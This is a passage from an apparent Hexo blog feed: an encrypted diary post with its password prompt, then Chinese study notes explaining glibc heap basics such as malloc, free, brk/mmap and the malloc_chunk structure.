02b763694d0f77a6140e4dd7dd32f46f90e5c054331fa5de263f35f6ef8292c62b67d47f5dba9271686614883eba34667d1c7a36c780413401c7d1ebcd4765ab91bb6d880c633466279ff5f7976c5938a940bafb7133e84cfeedf28e4dde278e1ecd61d7aaa60726246f8b1a1deee1a58391d0a1392fd3264686d5319da96ef2454fd9bebad1687bb6c01b1517502bb0dbd66bf839051873deee02f13250c7da22d60586bf41bd5bfab2a78288dd084c53a746ade2d193f28cb9c6dd69b7a37a87efac5c67dd4b92e7ea8f75340a7937c882f97526c99db46fc54c1f7dd869b59ca0aa4dff418e85f9cb339639ff078b934c238b2bc11d69b83aa3909251a14cd6611b0c9fcbb3e9bc4a54aab1239c0ee9dc2016731ebeaabad8e0d48cb69e186cbaff5886e3c6179fe8f8af30601b0ae21bf07a66e1ac87d34117dafb420908467c805006031d91c73a0ef038ab4925aab5c29836e5ee94802b3553e9f56187ed8804ffe3563f7dcd966e8cdc7431f9732a8912177badc1aabc4cfc78691daa31533bc44471d0a54e8adc1cd00be5df49e6bd86f1dfafefd7238fd68b837224734c25185838e95da2a1c641928d4fb1d866a2400f8a8b18b51997de5d0c70fad300974e4d47c6c4d7332ab0956ee357a4b012f629881a873970569ce82426857c9090cda1f3b2e449a3d9967df8e58ffbf181079caaf6c35b1a3dadf10451d374a4e905500dc4e9908fd096f8ba062dd79cc90ae241823ce2d5d924537283f8611816a6c2346677e0c1b42ac3d0501f84c0d8d33f33963ac4feafe4a82295367a66ef7e4ec283cfc3d6181a0a99cb37437812f497456af8eac1c456a764b13031789a342f734b5eb46e794def34e76519a6aef122b228bbc164c126011438b7fc440eb56a96535d41a07ed42dfb88a8980eefd62e975b64b212f843cf408a0b7b3934360212b93c2106a762f1cea21a3ac545f5e5c088ff0189655b6ab956ac644251eb4052f720f08427ee0922f80dac7d7de538c4f7ae2bc83dfe10f8a4ab015816944c239b7e2b929a3cd2988f9fa4fac707fa51d77853c4a7cb3a845ed61457966301778b82a7639e015cd56ad94b8bebace35036bcaf5a9ac75212ef90117d1fd6052ada94b4dccda2d85add51babf2426fc1cba75d9ab3523ca1fb7aa8f53fadaf31c44ea6889b729f10a274201d916cfa2789dd4385bef755f54ddccf934583d9878dd429632c1c1d8e0dae16f70255a0112cca6431b46b37d19d2f60db17b8fe3a403afa57e524dd56c31df1aa1867bb13c4fb9ce114640c6c4e643c47f0b17488d230a113fac65846b65eb435c6ea59fae0c0545045ad628378ae753bb2ae75866f219d71580aff2b95c1dd4aa8765bf83af2a4573b7855f64b9e0b4bd64466962644e491616fc21ef0319e5c6679256161e98a8e6f7b6b49ae2583128487d944799205bcb966aaab31d50f38fc539c74703718370531469f245ecd60dfa67b57dfed101cd7a15c176f72db136e1a7288d65f4d3123d2c000c7d39f66ca161358247b2e011b4bda1768bab74ddf79292ae858b59ad17bdf1d51e75465134908185db57086cd2da8a999885fb87eadad341a20874731e4ceaeb71c1a9c7ac8a3aeaa9028eebae80e83719f3ab6fc89f6df7ed182a593c0ff5d524101d697e4c742dea6cbf742134627a3a1ddb92a90c858e73a50131601b4302c971e37b2fefc82afa8333b7440e3036e5ea0f588c543a86f3e8ca02d18e2d1c7e9543c1331ac10bc95c85938e49b0fa52bd5485a833fefa15cea32e17067392011677f9269a5b2d45755e953f9eb99daa289dd3ca6241d9e6c800ac0cd00a021a6ca0af89288f6eef84a55bf0e514a82eac73c81094998dbc15b5f264b2dc2069a714798270ebde9bcbca1a4ee99b54f5b7521b0c83e61c3d8f9ca7a580b7af6c83c3bf8216be28cbb4307ca9d3b4ca6027974fd2dd4110d275e2267520309fca9160d909d9ccca0035fdf03e273935b8a2ae63753472d2d272b7513204eb5cc9a63e04bafc6fcd7c6f8b3d1e6e93d48176362d87407ae6abc9d546cda1e070b8d34017e563985ad139fc4613ef8021c561292098d620b7f96af90675341ec71834fe2ee0df5516c20f932d1868794da823384caf5106128ff1bca4f3eb19976ee401e5d5d10ef3e3b6e07f4a09d7d05db30f6fe46ef4c5d81df0955375050e9426b8b9e091c6f4c949d885e99d0702e3768fe9225aea4adda34bc1d10b981078fa097ceacd307d7c90aaea97c42a145969ed341b4eacf41f4cdf9fefeffd39c2843a11ef1acaf1d16b6b805bcfbd1796082d8f5315a7cc8c5e0802818b6b686aa5d5f92f1468b73b95af31c36db226825b106eede8ff159ebcce29de467d99f9f03528ef548dd5d988c54e67b2836c7b32aaa2d5befd2261dd12401aafabb1e7135b148b0765e9f68efc8d3a12a8f6f94303b88bd5ba26144132154840f20b43c73c6ec707691e1e592b3a85bda357b81b801c0b78962c0c7ca60e3e47e6117b0454169e014282b210d82c33c593653fe8c8917697c2796ad77aa7c3aadf8bd6ada3da01f704ce99c6bce218d60653eeb109ed622f33a52123aacc8feb188e4a553eb0fae5dff380f92d480356942326ff5c4ff5fc05b76c7d7babe05b73de823377fd78001c2d4f37434974c947c413b014e643450da5f9db9747dc6bb35ea0a7a9fe57edd06d55436beb1fb74a44c262e9903ae7d41aa2f9817673ebd4f88e5dff099880ef263026fb81402a24b756e84c1ef6f33e2454654ae4e57fcf68b3f4f20439c9276c0727f64270ca02ccc6138dbd0685c24e05b193ceb951db6a93fa408c3c618e037ae33cafc120bb5a94d62de45ce52d5efb274d74855025e6ee42660b0e30ffd10d3364e1151c9bf8d685d038b2799b073643bfd382cef5afdce937314e8327aee4adb1d22670232e66e0f7cf624bcc994d6b7e3da5d24bd76aba7d64c17463c82f63b02149b10a1291c00e79f59ddc44ed9073d73701a7770acffe562a0c13ab4851f926b01ea7acceb6877ad7d4159dfe69a1521b02447c45bde4f024ac912b9dac0f99b027e36f1c6a1a59a7408bb957b0e69cf91b90eed8159e31dd8c2d933744d67743cd03eab9dada04f9888ebf9a56efb12404136b54e8bcba88f6a0f443dbde8f5153a03607099cb5505128c64d236129597b82e2e111725166c2123bd765e460af4ebd999ffa57db106eeaeeccaa309500a4591abfab98ee523ac1a1eed19c5d15291a2eb0f04a5ad8635b6f0e5db63b915e873efe0442c5db4572ef0d1f5d6d7127e5fa92a33a540b3455b8904a5a84a99726f9808cb6ac93aef2de59d86b4fe282ef0c91c6a99d2ebf5f8d97ecbdb3822cb30be0d81883daf1bcd0d4ffbde72dd3de765f68f0661d30ea356da95410b03a356fd5294e3740c6d1928e00881020d36af8e938f21dee019fb8ec50e434bbe033975398bc9c88a4183b178a51474d3c0356cef6cad522723f6cb339ede124145514c20d912983b17a83139bf7b18909b2b702a4d3cb23bca2de659bd62526ff3ca8b26cd7f5f5e0c8f7ccf537f6a519e9c2bd0e6dfcb6cbf34688254bf4d9fefded95ff9c9cae585d2b115270a20ebae257c071ea36803c3d17b7e23e3019c93189a4c9f0fff97dd20fc03528f9dc3552f6d8ccbe9380a579cb0719631e6544f426e3f5f812630d3dd71d4a0dd6e731534c94cd395f20a364eafeafce01ffd386a8e9652ed63c7ff73076de89799f9f70b98d70eaee04783ab00ece94cac1c21e450f8303080eff5fa207a901a02dd07025025f6f9f05e60ac86de2be3c365832fbc5ec72b649c2a966514ae9611329db4ba2b6dfee6c5080ed8d3b1833420cb73e431a9beb9b7bb4e0f817f3814d3f41335b6a15604b2be25bbdb76d7b3f9b28c8f4ad5933f50854d882c101afac3d5adc7508d433e573c13340c2b008f803dce6bc7956b5d2d3edf09946c6cf42d4ac53676b8d14b3bd4899cfe565fdcbdb4fce85f1c6fd1e1546333fc1f72168579366926e9cc5fb21f48400f52a202032515649f8d35f03c8d526668db8629969ddba1d2e7f2cb825cf32996bf8652cbe12d8c6f19cc7f552103612d958b8a4e286c729228adc80314a97883b45d70193416da2bbc7396f7d910c8c8b99ebb219c886106ed196c4fe8cbb1b9e0a4db4a5af87352904274cc4f9dbaa88c84cedf1533bf9bee6300281454641af88e8a96f36945b62bc7b512cbe1cb874da1a3eb9f6df4b01df4d263545182934c6004457a471a865ec6976971c97fb37e0e0fc2bdc1b785941783b2d034cfe933e3ab4f4136486220f63fa8464312c9f92ab9149cb2174f2c9d8329c4f03df7b5b58563d37bcfa88bb46d2e13de779e14c1ce590ca1d6389a33525c31042f5fe4dd5fab0d9c155871b4643287be69a58dd13e931f0b443a7ced848d49938f27dd20202b60f018a846d1bc2ed3b6963bf2bd6a9ac743ed6c8c90be9765bbcd1ecc63e34f19058d6e6d7c3aa9a37503e867f26ce8d1e449110568d276e7681be0fc7c3bb2d66cbece7fff0efa34135bf642d80ae77f21f4ffa927b79978771925599f0de8019b177764502eefbd82830056d63d8b012a15a1fda25f336baa53cbb68d7cd243d8485a3f9c2ae0a953ef8656275b54182e0622ed7af1f3151afdb225cfe0257e801f9fc26ff0230cb5dc0096a045ca32f0441b4dc410375b397979442e876f7a6d0d165eea27886a7f34e15df7f7f7017051bf3f2c5fefe971318f0a00fb7f2064896025acdaf516dc1bcbe6ef25d076f446fa35c2bf6d9893399b96ba60e863635892493c3b953ce5f24c2d61fc411b4b48747b804286344db40e36fa2f1dbe180d783926a89f83648f30bb0535f8ba57bd737fc3ce4d2d74e4f25990f9d31016f0a034fa80487a8ca9a38d525b08bed4a472f31c799d5b5a48835359cdcb7ecddb4c7cc37d20a3c7aa06e33be792c2743881e0f474e4bb038a00a6d3d775434fece5dbeb077229fee18b127f356b20c81bcd0056d60462a22234f2b4f2fdf1b8f01191e77398dd58d613a05db891321de1aaef68bd90ce2b9b4005aaea6c7d8b3e2c457ec018be9cbfc89b212e8a70bd2de790b4ea9ea066e517c1838af55462385e5f007bfa52c56de39ce9df849661cc323df61dbd2944f70ad339c68b959d01da38fc2d3b339833befd7a07877419f0e95c83e978e35a175d62f671112df01762f38d88b3e38011a94b68a2602a9339d7ba80872cd8fe75f8fc4ae16a85a7ed0d2e952f79847f2d5a08fe7ccd4c695ecbbae5decf8d52bd0cbf0a272e36ede469dc274da909b6d60574fb0ee889ac753df5df8b9cfb902ae01aa461eb09a8d5ffe08990bbf57f9bd5d3739618521dd124b49d2bad3d5e57ae9431b0ab64c94c003e8b58f6bee4429315399ea6e3782dfbe13a80f84741fcbac303ee5495dadc8e7924f0fc632b89c28edda40bd82bd73f49aacd64ee73b587abc16d7b17d14fd3919b1bf976b0871a6101d518814940a5becc2a599e27461ca12c03ffab5d8b4a597295d0e5907546533040d022a0a579b44ea8a87af88c995f1ecff09e50427982409f71b4785b78c9a447b4dd0164daded3cbf7873f4517b4032a34aad5ecf98f19bd683ba12d0e65ca3811e182dd04161f2db69a78059cac27e7bcf1a64cb11a44b12c06b1649b7ed506938e9dc720af23b66320a0bd5e4fe9655ef9d7fea4be16ecf0c9a93d671af4451cfcf810e43370ff9b6d3c4b2c731bc37973b8509cb9a0239690aeef66795859b129c30e7720ae56244868bfb4000636d79fc11c429beab80cdecf6aa4d17bb5f4778de0f4f6327e10a4d66c08a9c6d6280a5e806d0c00a497999676cd138648f2a6c71213547dac9219968ca1e6fd9c8f57727bee50ad90055edab4d98c37cbc5c32defe2f0b331eb8f99f064ae2544cbefd9371cbb425aeb66ad973fe2fb6d848b320eb7200f9b5fe17d0127d51e513a818200da2b3a26147d82c1a2a989745fab522109823049dc1f47770ce96320ee2e9813bf09249401a250d52a4628b1a120938c65b08aa16eab376ed508a00bffd7616e332714ce34b8936105905dca999a468da7f57fc559aca98d8145b43f9414f96838654f51a433974d2445b16b1456d535371ef52bffbaf8f0a43ddc5d41cb8dbab70c82aa4cf2b88e3d214b1505450bddea30330e362552c5c2ea3a64c1b47edb16bd8f9ce7c5896fd40c0d880a8ee1a415b8c3488b1ad5dd14d1c3cfc30559e310a2b2519bb40f44de5f25842b099bb177919df5b3d45d3545788d907bf94c90a91a7bf985dc491b758f2a9c9f90364996299ce8b3ad2cb98dac2151f67751e6f5e755a9c9b7d2e3aed068fcd14aedfafcc3781c72236d6d9da3d33a5b6c806a1eac63907491bb199382cac7a275a3fb02592188c4996d2a911a9d6971362a13c2625d9a680060392a6a80362aaf148b6376d72d28f6d9e9e4c01d9a67724e45cb7af56b360345d9ea8c74951334f9c6372beb0b9ed839ebbc3af9850b3ab1914b7526c550f8ae324900b43741832617900f100c001338981318f2c7e40aad3efe2fef1a7d31c9ccd53b521bb125194123c19b152b8c9f7bfb86682bb022f4083cde26cdca61b737187f70b1bf16cba2a5bcba49f5747524bd29c38097795f147487a23c610c3dd4990d14a8103d702a7daf9c79809a960eca2bd1ae79e3cda50fe3a6607c27224ee93df756145244c610c4db5291c9c5a019f4312ebd2419ae44d66da86c9f841918c4ef6385ba85b982c75a8b2cb64aa07701569390b86ee271cf084030fb87c7233bedbc3a50b69ec2d30784995a9232e667d589ee326c6bbf8404f157987cba8ac18b00eaaeac2b248b3759998187c983e7462e663dcd5fb2c8b87cd24817b6e5400b1c3fe7b0bb625aa57ac62ad6621ec96dff5c457fe270b79b8a7a72b3668b753eed6d435097d98f7a420aa68bb94ffe803dd1f52889e49e6ecf7d649e7956f52a88d434988b3d85f95f35b5c9cf24258fae004b2bc03f3faa660c70f90b18abea4d9753210af66ecc3f188e96dbc79ae74df47ad9014f763946a8caf522b2b76f891c578d974883f24e900b930e9383870c1729880eb5481d5db84daf4cf36985f189d22c5608b4e97fd2f4fd624b45d40cc94cc7f904680c2642e641e0ce94e367b79cd06f8a5ab7877cc196c9b1f9e934f850d562fce54ddf6ce61bec3eb340f94183e1e8e805742e9dbee6d7a7e7de4f007f4a8361b8174d71b5e967f7c7f13ffef0bb2c0d235439fc2db6f5caed58fe2778313c69846be23f59d79813b52e12909b61956454384c0166dbf5e960483aafffc59ab46649a1582c7a1242300237c6d84be662719643558aaf404c9af8363df7de3821c885b76cb294014c5b6202e13a71b7f0ec97b1a61af956a6d48ff6cab795e2d83843b44158a9bb7be0ff530e70851cb47fc75af9fbc37d79a740a08d42f8638e0da6476097d6cff748db3c1ccf7138e4d30485796f272f04879ea7ea4881ef1d9e5cdf3778f4efd059077bf8f0454be27b561873c994beb870d5cd7c6165caea95e21694da2fbe8a7b3897ffaf4301cfa348ec21ee02049d8c50332c35ab166fb1c3c2135740f113259c11c184cc5f4cbe4c81b3a21b8f18d20c46e7e56239a475bf927b2296185279f2fa575bde462c5fc6ded7e97fefe53b66d8cace38ae019f65c4d5063ff38c43d932043948c15f183938f123d93acb3b7af50c3e71fa9637410155651fc00aef9d9a3bad02bb8976cb807a79f4f3455b4ca671ff470519f69d7fe7d449e9816c4161892f336300d154213cb45cce3252f8673ab0be2d9045ae6e9a31b776d539d10cf2a0fdd4305f1608d40999118d292a809cfc91bfd76e448c5e4793ed1f3940a7233c0ef1123d1ebe4579381b0714a990e4c820b73d0982f3a8b7458ce6611d215e9a4ef57c01c2c1f4baaad8d4556f8ab10a5faeffc7a6b58e37a20645f23ca0da04db31166e12209dd0bf2e8702238d2ea206269fb3d934c87f19d45def2742aa873b924eb4a087e9521a0eb43c2bec4c0e753178ad1364d63b9fd042b7be7cbe15732bcafd4bef3cb214aa3493a4e9b00326d9ed1c5edb9515bfba63d1d97110a4a08f313ce4573c4945ecaeb49cb9f86745f6b11837834fa493f735a1b324b60f22bd60a9ef89ff48f63a497105cdb799b6e178dfd0b7aa258a322da9f870f34be3b0b242af5b79773ef7519f135eafe822ea4f07bb19452f4ce9aefdff6ecf7467968595767e263781f942749422a1c6d04455b44afb3a0711f9979d16c662db826de9c434a19de0c0cc434fe53ef048a2246353d15aeef7c3a861ff188d9e9e1f88e6de4e1595389e386dcb2052eef2b5fe658713ffe6670ecdab2ec19bc9b2c8809c02dc967795ae4cb8f837a76839eeb9def0fbfdce2595bfae64ad7de5abbfae2ebe012fe4abcfc920f9849dbd9f5d4fc5e7f666d0f2efbe48b99cd17d465f65e617b88dc433df3dfb718bc8e730eba759cffbf38715caffef73e1c65b7a36abe55d82d86df9dbd717db2afde791493adeb19051230b98f40622418c7a2ec1b1e789d07e9d6b5fb4c98a1c57d74f593eaf9395b5157175bf56bffb4e351ef01731a643df3137a890e89e376b25882924675a23a8f6067359c15611f7881e29480010a745d092f2b94c79f469f9292963ce754705cdc82a8b66a4730aa8be190ddd1b7da1b094e9f426c06131931056a2802754c83c0f91e5e9ffc2a12e260be204686fba4ffa0d5145ac1a718794967980075b72995b1db70f158b9e513731b250ad1e2e915be1189533312486c8d0ac0cf355c536c4b43983186301e2421813b0dba8d81deebced5e199cb01c06aec738e448fad14697bbfb7195a40c0fe5b370cf121444de53348dfd48c6f8f2b1e4c9ff00f61ae79aff44ce6fb2c7aa807993f5b15f0c7337aa7929cbfa1c29104448146f17c758b450c4e1db2977826a7f3c41fdd572ca015b52e95aa96acec3b2ba06acfcfecd573181113efa934f4ac24ae1b8c20f26e90f6545d7391fe3f8b571e4c850c4d1e55c945be3cc039835556bda86d5fc4ffc5148393fb90a1300ac16b087d12de6429b257e6f65bdffae6611d3ca5e7ab35f8c1d9118b9cc73f53a3719cf7e2c0c359f7fb2235e40a84a46c4b4ba46e70192f4d3fa0392920763916d127b4ed93e1997e0d5353f9072299856839a8190212019b587b6b071292daa03e18a868324c10f141c9ba63594e7329adf6a09793c19ba644fffde7e24cd9282495db2430a8a8f06b6bcaa56b02305ec6e54dec54ac3f135db32adb19dffc0e8cf6758365ae9f3495355eb5c26378909a36e8a463f47fb9af5d6891225eb849dad96e867d2004cade9e48b557d6c5a10cff3bfa7176dad1425ea77e6e2e47f86b7aefe541259457fb6f521161a7172f08632ca99cad20ce316253507f2a48aad483e59676cdb3d941ee1b1cf60b12d068ae1cc40f44b645621d3bdfcac2aa30962e8a973cc0553707a8173269139aa64111ad93895e144793cc97bacae08235fe21688c7a0b0e7b54204eb8a9ddbd0732c34538ce3d4d18c73fbf916e40e61eb76d1769bb8305ff4657fe41feac49d0dff1daa975e2af07967ea394228a8c050906dbe2ea8790489e54ad776f9c6dd5998e97fa8cbed638c70084d3346c8ce92d927f8622928f6a0edc2ceb6357e1d547f4f0f13645365b98c9113c01ce0eb82a16ee5b40a458165194029b9027fe6b8b9cb1272f81d1edb37386c7807bc4ef963acd17834cdb543d1c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">输入密码，查看文章。</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>堆学习2 by Freedom-zy</title>
      <link href="/2021/10/12/%E5%A0%86%E5%AD%A6%E4%B9%A02/"/>
      <url>/2021/10/12/%E5%A0%86%E5%AD%A6%E4%B9%A02/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><p>系统开始是不分配堆空间的，当你调用malloc函数在内存中申请空间时，系统才会开辟一大片空间作为堆的分配使用空间。malloc函数再从这一片堆的分配使用空间中分配0x10大小的空间，将指向空间的地址返回给ptr（剩下的空间为topchunk）。</p>]]></content>
      
      
      <categories>
          
          <category> 2021年10月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>堆学习1 by wiki</title>
      <link href="/2021/10/09/%E5%A0%86%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/10/09/%E5%A0%86%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-堆的概述"><a href="#0x00-堆的概述" class="headerlink" title="0x00 堆的概述"></a>0x00 堆的概述</h1><p>根据内存的需求不同，堆的实现也有很多种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dlmalloc  – General purpose allocator</span><br><span class="line">ptmalloc2 – glibc</span><br><span class="line">jemalloc  – FreeBSD and Firefox</span><br><span class="line">tcmalloc  – Google</span><br><span class="line">libumem   – Solaris</span><br></pre></td></tr></table></figure><p>堆是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。（栈由高地址向低地址方向增长）</p><p><img src="https://i.loli.net/2021/10/09/yeBRXOVLfqJlx4a.png"></p><p>管理堆的程序被我们称为堆管理器，堆管理器处于用户程序和内核中间，主要做以下工作：</p><ol><li>用户程序申请内存的时候，堆管理器会向操作系统申请内存，然后返回给用户程序。<br>为了保证内存管理的高效性质，内核一般会预先分配很大一块连续内存作为堆，只有当堆空间不足的时候，堆管理器才会与操作系统进行交互。</li><li>管理用户所释放的内存。<br>一般来说，用户释放的内存空间并不会直接返还给操作系统，而是由堆管理器进行管理，这些内存可以用来响应用户新申请的内存请求。</li></ol><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span></span><br><span class="line"><span class="comment">  if no space is available. Additionally, on failure, errno is</span></span><br><span class="line"><span class="comment">  set to ENOMEM on ANSI C systems.</span></span><br><span class="line"><span class="comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span></span><br><span class="line"><span class="comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span></span><br><span class="line"><span class="comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span></span><br><span class="line"><span class="comment">  with negative arguments are interpreted as requests for huge amounts</span></span><br><span class="line"><span class="comment">  of space, which will often fail. The maximum supported value of n</span></span><br><span class="line"><span class="comment">  differs across systems, but is in all cases less than the maximum</span></span><br><span class="line"><span class="comment">  representable value of a size_t.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ol><li>malloc 函数返回对应大小字节的内存块的指针</li><li>当n=0时，返回当前系统允许的堆的最小内存块</li><li>size_t 是无符号数，当n为负数时，会申请很大的内存空间，但通常都会失败</li></ol><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      free(void* p)</span></span><br><span class="line"><span class="comment">      Releases the chunk of memory pointed to by p, that had been previously</span></span><br><span class="line"><span class="comment">      allocated using malloc or a related routine such as realloc.</span></span><br><span class="line"><span class="comment">      It has no effect if p is null. It can have arbitrary (i.e., bad!)</span></span><br><span class="line"><span class="comment">      effects if p has already been freed.</span></span><br><span class="line"><span class="comment">      Unless disabled (using mallopt), freeing very large spaces will</span></span><br><span class="line"><span class="comment">      when possible, automatically trigger operations that give</span></span><br><span class="line"><span class="comment">      back unused memory to the system, thus reducing program footprint.</span></span><br><span class="line"><span class="comment">    */</span></span><br></pre></td></tr></table></figure><ol><li>free 函数会释放由 p 所指向的内存块</li><li>当 p 为空指针时，函数不执行任何操作</li><li>当p已经被释放之后，再次释放会出现乱七八糟的效果，这就是 <code>double free</code>。</li><li>当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。</li></ol><h2 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h2><p>我们可以通过增加brk的大小来向操作系统申请内存。</p><p>初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启ASLR，两者的具体位置会有所不同：</p><ul><li>不开启ASLR，start_brk 以及 brk 会指向 data/bss 段的结尾。</li><li>开启ASLR， start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</li></ul><h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2><p>malloc 会使用 mmap 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。</p><h1 id="0x01-堆相关的数据结构"><a href="#0x01-堆相关的数据结构" class="headerlink" title="0x01 堆相关的数据结构"></a>0x01 堆相关的数据结构</h1><h2 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h2><ul><li>malloc 申请的内存在 ptmalloc 内部用malloc_chunk 结构体表示</li><li>当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中</li></ul><p>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构，但是根据是否被释放，它们的表现形式会有所不同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>prev_size：如果该chunk的物理相邻的前一地址chunk（两个指针的地址差值为前一chunk大小）是空闲的话，那这个字段记录的是前一个chunk的大小（包括chunk头）。否则存储物理相邻的前一个（较低地址）chunk的数据。</p></li><li><p>size：该chunk的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。</p><p>该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示：</p><ul><li>NON_MAIN_ARENA：记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li><li>IS_MAPPED：记录当前 chunk 是否是由 mmap 分配的。</li><li>PREV_INUSE：记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li></ul></li><li><p>fd，bk：chunk处于分配状态时，从fd字段开始是用户的数据。chunk处于空闲状态时，会被添加到对应的空闲管理链表中。</p><p>fd指向下一个（非物理相邻）空闲的chunk，bk指向上一个（非物理相邻）空闲的chunk。通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</p></li><li><p>fd_nextsize，bk_nextsize：只有 chunk 空闲的时候才使用，用于较大的chunk。</p><ul><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li></ul></li></ul><p>一个已经分配的 chunk 的样子如下。前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，指向 user data 的起始处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 